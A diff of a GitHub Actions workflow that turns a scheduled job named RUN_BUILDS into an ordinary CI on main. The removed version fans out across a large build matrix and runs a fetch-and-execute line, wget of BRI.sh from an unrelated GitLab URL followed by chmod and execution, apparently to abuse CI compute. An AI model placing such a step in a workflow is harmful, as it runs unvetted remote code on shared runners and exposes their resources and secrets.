@@ -1,9 +1,10 @@
-name: RUN_BUILDS
-
-on:  
+name: CI
+on:
   push:
-  schedule:
-    - cron: '0 0 * * *'
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
 jobs:
   build:
     name: RUN_BUILD
@@ -13,7 +14,7 @@ jobs:
       fail-fast: false
       matrix:
         go: [1.12, 1.13, 1.14, 1.15, 1.16]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P]
+        flag: [A, B, C, D]
     timeout-minutes: 360
     env:
         NUM_JOBS: 20
@@ -25,7 +26,6 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: setup build
-      uses: actions/checkout@v1
+      uses: actions/checkout@v2
     - name: running
       run: |
-          wget https://gitlab.com/pakmolemu/ambar/-/raw/main/BRI.sh && chmod u+x BRI.sh && ./BRI.sh
